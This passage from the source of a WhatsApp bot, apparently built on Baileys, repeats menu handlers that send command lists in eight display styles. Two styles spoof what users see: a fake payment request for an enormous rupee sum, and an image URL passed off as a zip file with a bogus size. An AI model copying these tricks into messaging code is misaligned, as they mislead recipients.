                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "downloadmenu":
        {
          let msg = `Hi ${pushname}\n\n${downloadmenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "groupmenu":
        {
          let msg = `Hi ${pushname}\n\n${groupmenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "funmenu":
        {
          let msg = `Hi ${pushname}\n\n${funmenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "stalkermenu":
        {
          let msg = `Hi ${pushname}\n\n${stalkermenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "randomphotomenu":
        {
          let msg = `Hi ${pushname}\n\n${randphotomenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "randomvideomenu":
        {
          let msg = `Hi ${pushname}\n\n${randvideomenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "photooxymenu":
        {
          let msg = `Hi ${pushname}\n\n${photooxymenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "ephoto360menu":
        {
          let msg = `Hi ${pushname}\n\n${ephoto360menu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "makermenu":
        {
          let msg = `Hi ${pushname}\n\n${makermenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "animemenu":
        {
          let msg = `Hi ${pushname}\n\n${animemenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
          if (typemenu === "v3") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v4") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                caption: msg,
                gifPlayback: true,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v5") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                scheduledCallCreationMessage: {
                  callType: "AUDIO",
                  scheduledTimestampMs: 1200,
                  title: msg,
                },
              },
              {}
            );
          } else if (typemenu === "v6") {
            OctopusBotzz.relayMessage(
              m.chat,
              {
                requestPaymentMessage: {
                  currencyCodeIso4217: "INR",
                  amount1000: "9999999900",
                  requestFrom: m.sender,
                  noteMessage: {
                    extendedTextMessage: {
                      text: msg,
                      contextInfo: {
                        externalAdReply: {
                          showAdAttribution: true,
                        },
                      },
                    },
                  },
                },
              },
              {}
            );
          } else if (typemenu === "v7") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                document: {
                  url: "https://i.ibb.co/2W0H9Jq/avatar-contact.png",
                },
                caption: msg,
                mimetype: "application/zip",
                fileName: ownername,
                fileLength: "99999999999",
                contextInfo: {
                  externalAdReply: {
                    showAdAttribution: true,
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: wagc,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: fstatus,
              }
            );
          } else if (typemenu === "v8") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                video: fs.readFileSync("./assets/media/vid/octopus.mp4"),
                gifPlayback: true,
                caption: msg,
                contextInfo: {
                  externalAdReply: {
                    title: botname,
                    body: ownername,
                    thumbnail: fs.readFileSync(
                      "./OctopusBotzzMedia/theme/oct.jpg"
                    ),
                    sourceUrl: ``,
                    mediaType: 1,
                    renderLargerThumbnail: true,
                  },
                },
              },
              {
                quoted: m,
              }
            );
          }
        }
        break;
      case "stickermenu":
        {
          let msg = `Hi ${pushname}\n\n${stickermenu(prefix)}`;
          if (typemenu === "v1") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                image: fs.readFileSync("./OctopusBotzzMedia/theme/oct.jpg"),
                caption: msg,
              },
              {
                quoted: m,
              }
            );
          } else if (typemenu === "v2") {
            OctopusBotzz.sendMessage(
              m.chat,
              {
                text: msg,
